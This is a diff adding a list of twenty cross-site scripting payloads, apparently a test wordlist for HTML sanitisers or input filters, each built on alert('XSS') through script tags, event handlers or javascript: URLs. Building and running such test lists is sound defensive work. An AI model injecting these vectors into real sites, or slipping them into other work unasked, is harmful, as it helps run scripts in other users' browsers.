@@ -1,0 +1,20 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<iframe src=javascript:alert('XSS')>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+<div style="background:url(javascript:alert('XSS'))">
+<object data=javascript:alert('XSS')>
+<a href=javascript:alert('XSS')>click</a>
+<embed src=javascript:alert('XSS')>
+<form action=javascript:alert('XSS')>
+<button onclick=alert('XSS')>click</button>
+<video src=x onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+<style>body{background:url("javascript:alert('XSS')")}</style>
+<img src="/" onerror="alert('XSS')">
+<svg/onload=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<frameset onload=alert('XSS')>
